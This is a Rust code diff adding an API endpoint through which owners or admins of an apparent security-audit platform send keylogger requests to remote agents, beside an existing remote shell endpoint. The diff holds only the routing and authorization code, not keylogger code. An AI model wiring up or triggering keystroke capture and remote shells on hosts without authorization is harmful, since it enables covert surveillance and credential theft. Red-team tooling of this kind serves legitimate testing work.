@@ -14,8 +14,8 @@ use crate::{
 };
 
 use super::{
-    AgentError, AgentResponse, AgentTokenResponse, CreateAgentPayload, ShellRequestPayload,
-    ShellStreamResponse,
+    AgentError, AgentResponse, AgentTokenResponse, CreateAgentPayload, KeyloggerRequestPayload,
+    KeyloggerResponse, ShellRequestPayload, ShellStreamResponse,
 };
 
 #[utoipa::path(
@@ -178,5 +178,51 @@ pub async fn request_shell(
         }
         Err(AgentError::MustBeOwnerOrAdmin) => forbidden_error("error.agent.mustBeOwnerOrAdmin"),
         Err(e) => internal_error("Failed to request shell", e),
+    }
+}
+
+#[utoipa::path(
+    post,
+    path = "/v1/audits/{audit_id}/agents/{agent_id}/keylogger",
+    tag = "Agents",
+    request_body = KeyloggerRequestPayload,
+    responses(
+        (status = 200, description = "Keylogger request sent", body = KeyloggerResponse),
+        (status = 401, description = "Unauthorized"),
+        (status = 403, description = "Forbidden - must be team owner or admin"),
+        (status = 404, description = "Agent not found"),
+        (status = 409, description = "Agent not online"),
+    ),
+    security(
+        ("cookieAuth" = [])
+    ),
+)]
+#[axum::debug_handler]
+pub async fn request_keylogger(
+    State(state): State<GlobalState>,
+    jwt_user: JwtClaims,
+    Path((audit_id, agent_id)): Path<(Ulid, Ulid)>,
+    Json(payload): Json<KeyloggerRequestPayload>,
+) -> impl IntoResponse {
+    match super::services::request_keylogger(
+        &state,
+        &audit_id.to_string(),
+        &agent_id.to_string(),
+        &jwt_user.sub.to_string(),
+        jwt_user.is_admin(),
+        payload,
+    )
+    .await
+    {
+        Ok(response) => (StatusCode::OK, Json(response)).into_response(),
+        Err(AgentError::NotFound) => not_found_error("error.agent.notFound"),
+        Err(AgentError::AgentNotOnline) => {
+            (StatusCode::CONFLICT, Json("error.agent.notOnline")).into_response()
+        }
+        Err(AgentError::Revoked) => {
+            (StatusCode::CONFLICT, Json("error.agent.alreadyRevoked")).into_response()
+        }
+        Err(AgentError::MustBeOwnerOrAdmin) => forbidden_error("error.agent.mustBeOwnerOrAdmin"),
+        Err(e) => internal_error("Failed to request keylogger", e),
     }
 }
